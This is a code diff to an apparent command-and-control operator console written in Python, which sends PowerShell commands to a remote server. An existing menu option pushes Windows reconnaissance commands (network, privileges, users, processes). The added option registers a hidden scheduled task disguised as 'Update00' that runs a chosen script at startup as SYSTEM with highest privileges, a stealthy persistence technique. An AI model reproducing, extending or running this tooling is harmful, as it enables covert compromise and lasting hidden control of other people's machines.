@@ -27,6 +27,7 @@ def main():
         print("2. New command")
         print("3. Upload from win")
         print("4. Win audit")
+        print("5. Install task")
         
         choice = input("Select an option: ").strip()
         
@@ -49,6 +50,13 @@ def main():
         elif choice == "4": # audit command
             command = r'powershell -c ipconfig /all; netstat -ano; whoami; whoami /priv; dir c:\Users; systeminfo; tasklist;'
             if command:
+                send_command_to_server(command, server_url)
+            else:
+                print("Error!")
+        elif choice == "5": # install task
+            script_path = input("Enter the full script path: ").strip()
+            if script_path:
+                command = 'powershell -c $script_path="{}"; $action=New-ScheduledTaskAction -Execute python.exe -Argument $script_path; $trigger=New-ScheduledTaskTrigger -AtStartup -Delay "00:02:00"; $settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden;Register-ScheduledTask -TaskName Update00 -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest;'.format(script_path)
                 send_command_to_server(command, server_url)
             else:
                 print("Error!")
